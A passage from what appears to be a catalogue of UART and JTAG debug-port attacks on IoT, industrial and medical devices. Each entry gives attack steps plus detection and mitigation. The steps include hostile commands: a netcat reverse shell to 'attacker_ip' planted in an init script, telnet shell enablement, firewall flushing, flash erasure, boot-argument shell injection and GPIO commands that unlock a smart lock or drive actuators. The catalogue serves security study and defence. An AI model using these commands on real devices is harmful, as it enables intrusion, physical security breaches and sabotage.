- **Target**: Industrial Sensor Device
- **Vulnerability**: Accessible boot menu via UART
- **MITRE**: T1542.003 - Bootloader Modification
- **Impact**: System control and persistence
- **Tools**: USB-TTL, U-Boot Console, Serial Terminal
- **Scenario**: Exploiting a UART boot interrupt to enter maintenance mode with full system privileges.
- **Attack Steps**: Step 1: Connect UART interface and launch terminal emulator. Step 2: Reboot the device and interrupt bootloader (e.g., press any key for U-Boot). Step 3: Check for available boot options. Step 4: Choose or set the environment to boot into maintenance/recovery mode. Step 5: Once booted into maintenance shell, remount file system as read-write. Step 6: Modify configuration files, change root password, or enable telnet.
- **Detection**: Monitoring bootloader changes
- **Solution**: Secure bootloader with password or fuse lock
- **Tags**: Bootloader, Maintenance Mode, UART

## Flash Memory Dump Using SPI via UART Bridge

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Embedded Controller
- **Vulnerability**: UART bridge enabled SPI flash read
- **MITRE**: T1005 - Data from Local System
- **Impact**: Firmware reverse engineering
- **Tools**: Flashrom, FTDI adapter in SPI mode, Binwalk
- **Scenario**: Leveraging UART-to-SPI bridge mode to dump flash content for reverse engineering firmware.
- **Attack Steps**: Step 1: Confirm that the MCU supports SPI via UART bridge (common in some SoCs). Step 2: Attach FTDI adapter to UART headers and activate SPI mode. Step 3: Use Flashrom to identify and read flash memory via the SPI bridge. Step 4: Save firmware image locally. Step 5: Analyze firmware for credentials or vulnerabilities.
- **Detection**: Monitor SPI flash access logs
- **Solution**: Disable SPI over UART mode or restrict firmware access
- **Tags**: SPI, Flashrom, Firmware Dump

## Setting Persistent Reverse Shell via Init Script

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart IoT Hub
- **Vulnerability**: Modifiable startup script via UART
- **MITRE**: T1059.004 - Unix Shell
- **Impact**: Persistent remote access
- **Tools**: BusyBox shell, nc (netcat), USB-TTL adapter
- **Scenario**: After gaining shell access via UART, attacker embeds a reverse shell in the startup script.
- **Attack Steps**: Step 1: Access UART shell with USB-TTL and login. Step 2: Edit startup script (/etc/init.d/rc.local) using vi. Step 3: Add command like nc attacker_ip 4444 -e /bin/sh &. Step 4: Save the file and reboot the system. Step 5: On reboot, device initiates a reverse shell connection to attacker.
- **Detection**: Detect abnormal outbound connections
- **Solution**: Harden scripts and block outgoing traffic
- **Tags**: Reverse Shell, UART, Netcat

## Dumping U-Boot Environment for Secrets

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT Wi-Fi Device
- **Vulnerability**: Cleartext secrets in U-Boot vars
- **MITRE**: T1552.001 - Credentials in Files
- **Impact**: Wi-Fi and root compromise
- **Tools**: U-Boot Shell, USB-TTL, Minicom
- **Scenario**: U-Boot stores cleartext credentials or Wi-Fi info; attacker dumps all variables via UART.
- **Attack Steps**: Step 1: Interrupt bootloader over UART. Step 2: At U-Boot prompt, run printenv. Step 3: Look for variables like wifi_ssid, wifi_pwd, root_pwd, etc. Step 4: Copy valuable data from UART logs. Step 5: Use the credentials for wireless access or root login.
- **Detection**: Scan UART logs for exposed strings
- **Solution**: Sanitize U-Boot variables in production
- **Tags**: UART, Bootloader Secrets

## Exploiting UART to Trigger Firmware Update Mode

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart Appliance
- **Vulnerability**: Unauthenticated update mode via UART
- **MITRE**: T1542 - Pre-OS Boot
- **Impact**: Firmware compromise
- **Tools**: USB-TTL, Firmware Loader Tool, Custom Payload
- **Scenario**: Attacker forces the device into firmware update mode to upload malicious firmware.
- **Attack Steps**: Step 1: Connect UART and open terminal. Step 2: Power cycle device and monitor for update mode key combination (e.g., "press 'u' for update"). Step 3: Press key to boot into update mode. Step 4: Transfer malicious firmware using Xmodem/Zmodem protocol. Step 5: Device accepts update and installs malicious payload.
- **Detection**: Monitor firmware signatures and bootloader logs
- **Solution**: Require signed updates only
- **Tags**: Firmware Injection, UART Exploit

## Bricking Device by Interrupting Flash Write via UART

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT Light Controller
- **Vulnerability**: No fail-safe during flash write
- **MITRE**: T1495 - Firmware Corruption
- **Impact**: Permanent DoS or service failure
- **Tools**: USB-TTL, Firmware Uploader, Reset Button
- **Scenario**: Exploiting UART access to start a firmware update, then force a reboot midway to corrupt flash and brick device.
- **Attack Steps**: Step 1: Connect UART and enter firmware upgrade mode via bootloader. Step 2: Start uploading a valid firmware using Xmodem. Step 3: In the middle of transfer, reboot device or cut power. Step 4: Flash write gets corrupted, and device fails to boot. Step 5: Device enters bootloop or is bricked.
- **Detection**: Detect power loss or transfer interruption
- **Solution**: Implement dual-partition failback system
- **Tags**: Flash Bricking, UART Fault Injection

## Reverse Engineering Device Logic via UART Shell

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart Alarm System
- **Vulnerability**: Shell access exposes internal logic
- **MITRE**: T1201 - Discovery
- **Impact**: Logic cloning or replication
- **Tools**: USB-TTL, Minicom, ps, cat, vi, BusyBox shell
- **Scenario**: Attacker accesses UART shell and reads running processes and startup logic to reverse engineer system behavior.
- **Attack Steps**: Step 1: Open the device casing and identify UART headers. Step 2: Connect the USB-TTL adapter to TX, RX, GND and launch Minicom. Step 3: Power up the device and observe output. Step 4: Login using default/root credentials (often no password). Step 5: Use ps to list running processes. Step 6: Check startup files (/etc/init.d/, /etc/rc.local) with cat or vi. Step 7: Trace which scripts start services or handle buttons/sensors. Step 8: Document logic and communication for reverse engineering.
- **Detection**: Compare firmware integrity or file diffs
- **Solution**: Obfuscate startup scripts, disable UART in production
- **Tags**: Reverse Engineering, UART Shell

## Remote Unlock of Smart Lock via UART Command

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart Door Lock
- **Vulnerability**: Command-line access to lock mechanism
- **MITRE**: T1490 - Inhibit System Recovery
- **Impact**: Physical security breach
- **Tools**: USB-TTL, Minicom, echo command, GPIO
- **Scenario**: Using UART shell, attacker executes command to unlock a smart lock device without valid credentials.
- **Attack Steps**: Step 1: Connect UART and log in to BusyBox shell. Step 2: Identify GPIO interface controlling the lock mechanism. Step 3: Use echo 1 > /sys/class/gpio/gpioX/value to trigger unlock. Step 4: Lock disengages without proper authentication. Step 5: Reverse engineer lock logic to understand command structure.
- **Detection**: Log GPIO state transitions
- **Solution**: Implement hardware-level access control
- **Tags**: Smart Lock, UART GPIO

## Monitoring Serial Debug Output for Secrets

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT Gateway
- **Vulnerability**: Verbose UART debug logs
- **MITRE**: T1557.003 - Man-in-the-Middle
- **Impact**: Secret key or API token exposure
- **Tools**: USB-TTL, Minicom, Logging Script
- **Scenario**: Attacker passively observes UART output to capture debug logs, hardcoded secrets, and memory dump info.
- **Attack Steps**: Step 1: Identify UART output lines using oscilloscope or multimeter. Step 2: Connect only RX and GND to avoid interference. Step 3: Start Minicom and log boot/output messages. Step 4: Analyze logs for credentials, API keys, and Wi-Fi configs. Step 5: Extract any leaked keys for further exploitation.
- **Detection**: Monitor for continuous UART RX activity
- **Solution**: Remove debug prints in production firmware
- **Tags**: Passive UART, Debug Leakage

## Uploading Custom Kernel via Bootloader UART

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT Router
- **Vulnerability**: Bootloader allows kernel replacement
- **MITRE**: T1542.003 - Bootloader Modification
- **Impact**: Device rootkit installation
- **Tools**: U-Boot, USB-TTL, kermit, Tera Term
- **Scenario**: An attacker uses UART bootloader access to load and boot a malicious kernel image.
- **Attack Steps**: Step 1: Connect UART and interrupt bootloader using keypress. Step 2: Use loady command to prepare device to receive kernel. Step 3: In terminal, send kernel image via YMODEM or Kermit. Step 4: Boot kernel using bootm or bootz. Step 5: Custom kernel loads with attacker-injected logic.
- **Detection**: Monitor firmware image hashes
- **Solution**: Use signed kernels, restrict bootloader
- **Tags**: Kernel Injection, Bootloader

## Bypassing Encrypted Storage by Mounting Filesystem

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT DVR System
- **Vulnerability**: Encrypted FS with weak/embedded key
- **MITRE**: T1552.004 - Private Keys
- **Impact**: Data leakage or corruption
- **Tools**: USB-TTL, BusyBox, mount, losetup
- **Scenario**: The attacker logs in via UART and mounts the encrypted filesystem using embedded keys or bypasses encryption entirely.
- **Attack Steps**: Step 1: Gain UART shell access. Step 2: Locate encrypted partition (/dev/mtdX or /dev/loopX). Step 3: Use losetup or mount -t crypto with embedded password/key. Step 4: Mount the filesystem and browse user data/configs. Step 5: Extract files and modify contents if needed.
- **Detection**: Mount command logs
- **Solution**: Avoid hardcoded keys, use TPMs
- **Tags**: Encrypted Filesystem, UART

## Toggling Firmware Update Pins via JTAG

- **Attack Type**: JTAG Debug Port Exploitation
- **Target**: Industrial Controller
- **Vulnerability**: Boot mode controlled via GPIO
- **MITRE**: T1495 - Firmware Corruption
- **Impact**: Unauthorized firmware injection
- **Tools**: OpenOCD, JTAGulator, GPIO dump
- **Scenario**: Attacker uses JTAG to flip hardware pins (e.g., BOOT0) to force device into DFU mode.
- **Attack Steps**: Step 1: Locate JTAG pads and identify pinout. Step 2: Connect to device via OpenOCD and run a GPIO scan. Step 3: Identify firmware-related boot pins. Step 4: Toggle these pins via JTAG interface. Step 5: Reboot the device into firmware update mode.
- **Detection**: Monitor GPIO state changes
- **Solution**: Lock BOOT pins with fuses
- **Tags**: Firmware, BOOT Pin, JTAG

## Timing Attack via UART Output Parsing

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart Meter
- **Vulnerability**: Timing-based password leakage
- **MITRE**: T1110 - Brute Force
- **Impact**: Credential compromise
- **Tools**: USB-TTL, Minicom, Python timing script
- **Scenario**: Exploiting password validation timing differences in UART shell to brute force credentials.
- **Attack Steps**: Step 1: Connect UART and reach login prompt. Step 2: Automate brute force via script measuring UART response delay. Step 3: Infer partial password correctness based on response time. Step 4: Gradually guess full password and log in. Step 5: Gain shell access.
- **Detection**: Abnormal login attempts or delays
- **Solution**: Constant-time checks and rate limiting
- **Tags**: UART Brute Force, Timing Attack

## Disabling Security Daemon via UART

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart Appliance
- **Vulnerability**: Weak daemon protections
- **MITRE**: T1562.001 - Disable or Modify Tools
- **Impact**: Bypass of login/auth restrictions
- **Tools**: USB-TTL, ps, kill, chmod
- **Scenario**: The attacker disables a process (e.g., authd) that manages login restrictions or firewall.
- **Attack Steps**: Step 1: Gain UART shell access. Step 2: Use ps to locate the security daemon. Step 3: Kill process using kill PID. Step 4: Prevent restart by renaming or modifying init script. Step 5: Reboot device and maintain open access.
- **Detection**: Missing daemon in process list
- **Solution**: Use secure init, watchdog processes
- **Tags**: Disable Auth Service

## Automated Reverse Shell Deployment via JTAG Injection

- **Attack Type**: JTAG Debug Port Exploitation
- **Target**: Embedded Linux Module
- **Vulnerability**: Writable exec memory with JTAG
- **MITRE**: T1055 - Process Injection
- **Impact**: Remote access and persistence
- **Tools**: OpenOCD, GDB, Reverse Shell Payload
- **Scenario**: Injecting shellcode directly into memory region that runs at boot to create a reverse shell.
- **Attack Steps**: Step 1: Halt CPU via JTAG with OpenOCD. Step 2: Identify writable memory location with boot execution privileges. Step 3: Use GDB to write reverse shell payload in raw opcodes. Step 4: Set PC (program counter) to payload start. Step 5: Resume CPU and initiate outbound shell.
- **Detection**: Watch memory access patterns
- **Solution**: Disable JTAG or memory remap
- **Tags**: Reverse Shell, Memory Injection

## UART Command Injection to Trigger Physical Actuators

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart Factory Controller
- **Vulnerability**: No control over GPIO access
- **MITRE**: T1490 - Inhibit System Recovery
- **Impact**: Physical disruption or overload
- **Tools**: USB-TTL, Echo commands, GPIO
- **Scenario**: Attacker sends commands over UART to activate physical components (like relays, motors).
- **Attack Steps**: Step 1: Gain UART access and login. Step 2: Use documentation or trial-error to identify GPIO pins. Step 3: Issue echo 1 > /sys/class/gpio/gpioX/value to activate actuator. Step 4: Observe motor spin or relay click. Step 5: Chain commands into malicious logic (e.g., overload).
- **Detection**: Monitor GPIO state logs
- **Solution**: Implement GPIO access control
- **Tags**: Physical Actuation via UART

## Erasing Flash Memory via UART Bootloader

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart Controller
- **Vulnerability**: Lack of erase command protection
- **MITRE**: T1495 - Firmware Corruption
- **Impact**: Full denial of service
- **Tools**: USB-TTL, Minicom, U-Boot CLI
- **Scenario**: Using UART bootloader to execute a flash erase command, wiping entire firmware and bricking the device.
- **Attack Steps**: Step 1: Connect to UART and interrupt U-Boot on boot. Step 2: Access shell prompt and run help to list commands. Step 3: Execute erase command on primary flash storage (e.g., erase 0x0 0x3FFFFF). Step 4: Confirm action if prompted. Step 5: Device loses firmware and reboots to blank state.
- **Detection**: Boot logs, flash partition errors
- **Solution**: Restrict or remove erase features
- **Tags**: Flash Erase, Bricking, UART

## Dumping RAM Using JTAG for Live Key Extraction

- **Attack Type**: JTAG Debug Port Exploitation
- **Target**: IoT Secure Gateway
- **Vulnerability**: Unlocked memory access via JTAG
- **MITRE**: T1557 - Man-in-the-Middle
- **Impact**: Confidential key leakage
- **Tools**: OpenOCD, GDB, JTAG debugger
- **Scenario**: Attacker pauses processor using JTAG to dump volatile RAM and extract encryption keys used during runtime.
- **Attack Steps**: Step 1: Identify and connect JTAG interface to device. Step 2: Halt the CPU using OpenOCD. Step 3: Use GDB to dump contents of active memory segments. Step 4: Analyze dumped RAM for patterns of AES or RSA keys. Step 5: Save keys for decrypting traffic or firmware.
- **Detection**: Monitor for unexpected CPU halts
- **Solution**: Disable JTAG in firmware or fuse memory
- **Tags**: JTAG RAM Dump, Key Extraction

## Persistent Telnet Enablement via UART

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT Thermostat
- **Vulnerability**: UART exposes init scripts
- **MITRE**: T1059.004 - Unix Shell
- **Impact**: Remote access persistence
- **Tools**: USB-TTL, vi, BusyBox, Telnet client
- **Scenario**: Enabling a disabled Telnet service using UART to edit init scripts and maintain persistent access.
- **Attack Steps**: Step 1: Log into device using UART shell. Step 2: Open /etc/init.d/rc.local or /etc/init.d/networking. Step 3: Add command telnetd or telnetd -l /bin/sh. Step 4: Save and reboot. Step 5: Use Telnet client on same LAN to access shell remotely.
- **Detection**: Monitor open ports after boot
- **Solution**: Harden init files, block telnet
- **Tags**: Telnet Enablement, Init Script

## Hijacking OTA Update System via UART Shell

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart Home Hub
- **Vulnerability**: OTA script modifiable via UART
- **MITRE**: T1564 - Hide Artifacts
- **Impact**: Backdoor or rootkit installation
- **Tools**: USB-TTL, curl/wget, BusyBox
- **Scenario**: Attacker modifies OTA update script to pull firmware from their malicious update server.
- **Attack Steps**: Step 1: Log into the device through UART terminal. Step 2: Locate OTA update script (e.g., /usr/bin/update.sh). Step 3: Replace download URL with attacker’s web server IP. Step 4: Host malicious firmware on attacker-controlled server. Step 5: Trigger update manually or wait for scheduled OTA.
- **Detection**: Check update source log/IP
- **Solution**: Sign OTA scripts or verify checksum
- **Tags**: OTA Abuse, Update Redirection

## Credential Harvesting from Config Files

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Embedded Linux Camera
- **Vulnerability**: Plaintext credentials in config files
- **MITRE**: T1552 - Unprotected Credentials
- **Impact**: Credential reuse and lateral movement
- **Tools**: USB-TTL, cat, grep
- **Scenario**: Attacker locates plain-text credentials in exposed config files using UART shell.
- **Attack Steps**: Step 1: Connect to device’s UART and log into the shell. Step 2: Use find / -name "*.conf" to locate config files. Step 3: Use grep to search for password, user, or key. Step 4: Record all credentials and test them on network services.
- **Detection**: File integrity monitoring
- **Solution**: Encrypt or hash stored credentials
- **Tags**: UART, Config Files, Plaintext Password

## Manipulating Boot Delay for Brute Forcing

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Wi-Fi Repeater
- **Vulnerability**: Short boot delay limits access window
- **MITRE**: T1110 - Brute Force
- **Impact**: Increased UART exploitation success
- **Tools**: USB-TTL, Minicom, printenv/setenv
- **Scenario**: Increasing bootloader timeout using UART to give attacker more time to interact with console.
- **Attack Steps**: Step 1: Connect UART and interrupt U-Boot bootloader. Step 2: Use printenv to list boot delay (e.g., bootdelay=1). Step 3: Set bootdelay=10 using setenv. Step 4: Save using saveenv. Step 5: Use new time window for password brute forcing or data extraction.
- **Detection**: Detect modified env vars
- **Solution**: Lock U-Boot or use password on console
- **Tags**: Boot Delay, UART Exploit

## Intercepting UART Commands to Understand Device Logic

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT Alarm Panel
- **Vulnerability**: Unencrypted UART protocol
- **MITRE**: T1040 - Network Sniffing
- **Impact**: Protocol understanding for emulation
- **Tools**: Logic Analyzer, Saleae, USB-TTL
- **Scenario**: Using passive sniffing to observe how external commands are translated internally by the device.
- **Attack Steps**: Step 1: Identify UART RX/TX lines with multimeter. Step 2: Connect logic analyzer in parallel to capture data. Step 3: Power on the device and observe startup commands. Step 4: Send commands from physical buttons/app and watch corresponding UART output. Step 5: Analyze packet format, authentication strings, and internal logic.
- **Detection**: Log unusual UART sequences
- **Solution**: Encrypt internal UART comms
- **Tags**: UART Sniffing, Passive Observation

## Exploiting Firmware Recovery Utility via UART

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Embedded Device with Failsafe
- **Vulnerability**: Recovery feature unauthenticated
- **MITRE**: T1542 - Boot Modification
- **Impact**: Full control via trusted update
- **Tools**: USB-TTL, Xmodem tool, Custom firmware
- **Scenario**: Device includes firmware recovery menu via UART, attacker uploads backdoored recovery image.
- **Attack Steps**: Step 1: Connect UART and watch for recovery mode option on boot (e.g., "press R for recovery"). Step 2: Enter recovery mode. Step 3: Use tool like sx (Xmodem) to upload modified firmware. Step 4: Device installs and reboots into attacker-controlled environment.
- **Detection**: Detect abnormal firmware hashes
- **Solution**: Sign recovery binaries and encrypt loader
- **Tags**: Recovery Abuse, UART, Xmodem

## Remote Reboot Trigger via UART-Controlled Watchdog

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Industrial Switch
- **Vulnerability**: Watchdog not protected or rate-limited
- **MITRE**: T1499 - Endpoint Denial of Service
- **Impact**: Forced service interruption
- **Tools**: USB-TTL, echo, watchdog binary
- **Scenario**: Using UART to trigger a manual watchdog reboot to force service restart or denial.
- **Attack Steps**: Step 1: Connect to UART terminal. Step 2: Find watchdog path (/dev/watchdog). Step 3: Write V character using echo V > /dev/watchdog. Step 4: This triggers reboot depending on kernel configuration. Step 5: Reboot may reset device to insecure default state.
- **Detection**: Detect frequent unexpected reboots
- **Solution**: Secure watchdog interface access
- **Tags**: UART Watchdog Exploit

## Bypassing Secure Boot Check via U-Boot Variable Tampering

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT Firmware Bootloader
- **Vulnerability**: Misconfigured secure boot flags
- **MITRE**: T1542.003 - Bootloader Modification
- **Impact**: Boot unsigned or backdoored firmware
- **Tools**: USB-TTL, Minicom, printenv/setenv
- **Scenario**: Tampering with boot variables to bypass secure boot logic using UART access.
- **Attack Steps**: Step 1: Interrupt bootloader over UART. Step 2: Use printenv to check secure boot variable (e.g., secureboot=1). Step 3: Run setenv secureboot 0 or similar. Step 4: Boot using bootm or run bootcmd. Step 5: Device may bypass security checks and load unsigned code.
- **Detection**: U-Boot variable diff check
- **Solution**: Use OTP fuses for secure boot enforcement
- **Tags**: Secure Boot Bypass, UART

## Replacing Default Homepage File via UART Shell

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT Web Interface Device
- **Vulnerability**: Writable file system via UART
- **MITRE**: T1059.007 - JavaScript
- **Impact**: Defacement, social engineering
- **Tools**: USB-TTL, vi editor, BusyBox shell
- **Scenario**: Using UART access to modify the default web UI homepage file and inject malicious JavaScript.
- **Attack Steps**: Step 1: Connect UART and access shell prompt. Step 2: Locate web directory, usually /www/ or /var/www/html/. Step 3: Use vi to open index.html. Step 4: Inject JavaScript (e.g., alert('Hacked');). Step 5: Save and reboot or restart web server. Step 6: Anyone accessing the web panel sees altered page.
- **Detection**: Monitor web file changes
- **Solution**: Mount file system as read-only in production
- **Tags**: Web UI, UART, JavaScript Injection

## Disabling Firewall via UART to Enable Remote Access

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Embedded Router
- **Vulnerability**: UART shell permits network config changes
- **MITRE**: T1562.004 - Disable or Modify System Firewall
- **Impact**: Network exposure
- **Tools**: USB-TTL, iptables, BusyBox
- **Scenario**: Using UART shell to disable iptables firewall, allowing unrestricted access from remote IPs.
- **Attack Steps**: Step 1: Connect via UART to obtain shell access. Step 2: Run iptables -L to inspect current rules. Step 3: Use iptables -F to flush all rules. Step 4: Verify open access by connecting via SSH or Telnet. Step 5: Optional: Modify /etc/rc.local to disable firewall on boot.
- **Detection**: Check for firewall rules on boot
- **Solution**: Harden iptables rules and restrict root access
- **Tags**: Firewall Bypass, UART

## U-Boot Environment Reversion to Factory Defaults

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart Gateway
- **Vulnerability**: Environment settings revertible via UART
- **MITRE**: T1542.003 - Bootloader Modification
- **Impact**: Loss of security hardening
- **Tools**: USB-TTL, U-Boot, Minicom
- **Scenario**: Using UART console to erase modified bootloader variables and revert to insecure factory defaults.
- **Attack Steps**: Step 1: Interrupt U-Boot bootloader over UART. Step 2: Execute env default -a to revert all variables. Step 3: Run saveenv to persist changes. Step 4: Reboot device and test for default credentials or open services.
- **Detection**: Audit U-Boot env and integrity
- **Solution**: Use locked U-Boot config in production
- **Tags**: U-Boot Reset, UART

## Brute Forcing Login via UART without Lockout

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart IoT Box
- **Vulnerability**: No lockout or delay on login failures
- **MITRE**: T1110 - Brute Force
- **Impact**: Unauthorized access
- **Tools**: USB-TTL, Python script, Minicom
- **Scenario**: Attacker attempts hundreds of password guesses through UART login due to absence of lockout.
- **Attack Steps**: Step 1: Connect UART and open terminal. Step 2: Use Python script to send automated login attempts. Step 3: Watch for successful login message (e.g., Welcome root). Step 4: Record successful credential. Step 5: Use credential for deeper access.
- **Detection**: Track UART login attempts
- **Solution**: Implement lockout or rate-limiting in login module
- **Tags**: Brute Force, UART Login

## Hijacking Firmware Boot Sequence via JTAG

- **Attack Type**: JTAG Debug Port Exploitation
- **Target**: Smart Medical Sensor
- **Vulnerability**: Executable boot memory is writable
- **MITRE**: T1055.012 - Memory Manipulation
- **Impact**: Firmware hijack
- **Tools**: OpenOCD, Bus Blaster, GDB
- **Scenario**: Modifying memory register during boot to change execution flow using JTAG.
- **Attack Steps**: Step 1: Identify JTAG header and connect using Bus Blaster. Step 2: Use OpenOCD to halt CPU just after power-on. Step 3: View program counter and memory map. Step 4: Change jump address to attacker-controlled region in RAM. Step 5: Resume CPU to execute modified boot logic.
- **Detection**: Monitor boot register changes
- **Solution**: Secure boot regions and lock boot memory
- **Tags**: JTAG, Memory Hijack

## Gaining Boot-Level Access via UART Recovery Jumper

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart Light Hub
- **Vulnerability**: Recovery mode lacks authentication
- **MITRE**: T1542.003 - Bootloader Modification
- **Impact**: Bypass of login protection
- **Tools**: USB-TTL, Jumper wire, UART cable
- **Scenario**: Attacker bridges recovery jumper and uses UART to boot into recovery shell without login.
- **Attack Steps**: Step 1: Identify recovery jumper on PCB marked "REC" or "BOOT". Step 2: Place jumper to bridge the pads. Step 3: Power on and connect via UART. Step 4: Observe if recovery shell is provided (no password). Step 5: Access shell and modify files or reset passwords.
- **Detection**: Detect jumper status or boot mode
- **Solution**: Lock recovery mode, require auth
- **Tags**: Recovery Jumper, UART Shell

## Serial Logging to External System for Recon

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT Environmental Sensor
- **Vulnerability**: Debug output contains operation logs
- **MITRE**: T1087 - Account Discovery
- **Impact**: Target profiling, operational timing
- **Tools**: Logic Analyzer, USB-TTL (RX-only), Logging Software
- **Scenario**: Passively logging serial output to study system behavior, identify user patterns, or detect update schedules.
- **Attack Steps**: Step 1: Connect only RX and GND to UART to avoid affecting device. Step 2: Launch logger to collect real-time serial output. Step 3: Observe user logins, system events, and scheduled jobs. Step 4: Correlate logs with known services. Step 5: Use timing to plan future exploit windows.
- **Detection**: Monitor for external UART readers
- **Solution**: Strip debug prints from production firmware
- **Tags**: UART Logging, Passive Recon

## Triggering Debug Mode via JTAG Reset Vector

- **Attack Type**: JTAG Debug Port Exploitation
- **Target**: Embedded RTOS Board
- **Vulnerability**: Reset vector modifiable via JTAG
- **MITRE**: T1601.001 - Modify System Image
- **Impact**: Debug bypass, full device access
- **Tools**: JTAGulator, GDB, OpenOCD
- **Scenario**: Forcing the CPU to enter debug state by modifying reset vector to debug handler address.
- **Attack Steps**: Step 1: Halt CPU using JTAG on power-up. Step 2: View reset vector in memory map. Step 3: Change value to point to debug shellcode in RAM. Step 4: Resume execution. Step 5: Shell or debug menu opens instead of normal boot.
- **Detection**: Watch for unauthorized reset redirection
- **Solution**: Lock reset vector in ROM/fuse
- **Tags**: Reset Vector, Debug Mode

## Uploading Alternate OS via UART for Forensics

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Forensic Analysis on IoT Device
- **Vulnerability**: No bootloader restrictions on RAM images
- **MITRE**: T1005 - Data from Local System
- **Impact**: Volatile memory forensics
- **Tools**: USB-TTL, Kermit, RAM Boot Image
- **Scenario**: Using UART bootloader to upload a forensic OS like BusyBox Linux into RAM without touching flash.
- **Attack Steps**: Step 1: Interrupt bootloader using UART. Step 2: Use loadb or loadx to upload custom RAM-only OS. Step 3: Boot image from memory using bootm or equivalent. Step 4: Analyze system in RAM, extract files without writing to disk. Step 5: Power off device to leave no trace.
- **Detection**: Unusual boot image usage
- **Solution**: Lock down bootloader commands
- **Tags**: RAM Forensics, UART

## Exploiting Serial Console Buffer Overflow

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Outdated Smart IoT Device
- **Vulnerability**: No input validation on UART console
- **MITRE**: T1203 - Exploitation for Privilege Escalation
- **Impact**: Local privilege or command injection
- **Tools**: USB-TTL, Custom script, Python
- **Scenario**: Overflowing UART input buffer by sending excess input, potentially allowing arbitrary code execution.
- **Attack Steps**: Step 1: Connect to UART terminal. Step 2: Identify input buffer limits through experimentation. Step 3: Send long payload (e.g., 1000+ characters) to crash system. Step 4: If exploitable, craft shellcode with return address overwrite. Step 5: Execute shellcode on reboot.
- **Detection**: UART crash logs
- **Solution**: Use input sanitization and bounds checking
- **Tags**: UART Buffer Overflow

## Forcing Factory Reset via UART Hidden Menu

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Smart Gateway
- **Vulnerability**: Factory reset not protected or logged
- **MITRE**: T1490 - Inhibit System Recovery
- **Impact**: Loss of audit data, security configs
- **Tools**: USB-TTL, Minicom
- **Scenario**: Some IoT devices have hidden UART boot menus that allow factory resets, even when locked.
- **Attack Steps**: Step 1: Power off the IoT device. Step 2: Connect UART pins (TX, RX, GND) to USB-TTL. Step 3: Open Minicom (or PuTTY) with 115200 baud rate. Step 4: Power on the device and watch UART output. Step 5: Press key (e.g., 'F' or '1') when prompted to enter hidden recovery menu. Step 6: Select factory reset option. Step 7: Device resets, losing credentials, logs, or firewall configs.
- **Detection**: Unexpected factory reset behavior
- **Solution**: Add password to reset menu, log resets
- **Tags**: UART Recovery Menu, Hidden Options

## Redirecting Logs to External System via UART Shell

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT Sensor Gateway
- **Vulnerability**: Logs sent in plaintext via syslog
- **MITRE**: T1041 - Exfiltration Over C2 Channel
- **Impact**: Operational and credential leakage
- **Tools**: USB-TTL, BusyBox, syslog, netcat
- **Scenario**: Attacker uses UART shell to redirect logs (syslog) to their own server to exfiltrate operational data.
- **Attack Steps**: Step 1: Connect UART and access BusyBox shell. Step 2: Edit syslog config (/etc/syslog.conf or syslogd arguments). Step 3: Set remote server IP and port for log delivery. Step 4: Restart syslogd or reboot device. Step 5: Use nc -l -p 514 on attacker’s server to collect logs.
- **Detection**: Monitor for external log destinations
- **Solution**: Encrypt logs, whitelist destinations
- **Tags**: Syslog Exfiltration, UART Config Edit

## Injecting Debug Flag into Boot Args via U-Boot

- **Attack Type**: UART Debug Port Exploitation
- **Target**: Linux-based Smart Appliance
- **Vulnerability**: Bootargs modifiable without auth
- **MITRE**: T1542.003 - Bootloader Modification
- **Impact**: Root shell without authentication
- **Tools**: USB-TTL, U-Boot Shell, Minicom
- **Scenario**: By modifying U-Boot bootargs, attacker enables verbose debug or insecure modes in the kernel.
- **Attack Steps**: Step 1: Connect UART and interrupt bootloader by pressing any key. Step 2: Run printenv and find bootargs variable. Step 3: Use setenv bootargs "... debug init=/bin/sh" to inject debug shell. Step 4: Use boot to continue. Step 5: Device boots into debug shell, skipping login.
- **Detection**: Watch for modified bootargs
- **Solution**: Lock U-Boot env with password or OTP
- **Tags**: Boot Args Exploit, UART Bypass

## Backing Up Entire Flash via UART and U-Boot

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT Gateway
- **Vulnerability**: U-Boot permits memory readout
- **MITRE**: T1005 - Data from Local System
- **Impact**: Full firmware clone, offline reverse engineering
- **Tools**: USB-TTL, U-Boot Shell, loadb, Python XMODEM
- **Scenario**: Using UART console and U-Boot to dump the entire firmware flash and clone the device.
- **Attack Steps**: Step 1: Connect UART and interrupt U-Boot bootloader. Step 2: Identify flash memory address (e.g., 0x0 to 0x3FFFFF). Step 3: Use md or cp to load segments to RAM. Step 4: Use loadb or loadx to send it via UART. Step 5: Receive data using Python XMODEM script and store image.
- **Detection**: Monitor UART tx logs
- **Solution**: Disable dump commands, encrypt flash
- **Tags**: Firmware Dumping, UART Clone

## Enabling Unused Network Service via UART

- **Attack Type**: UART Debug Port Exploitation
- **Target**: IoT Light Controller
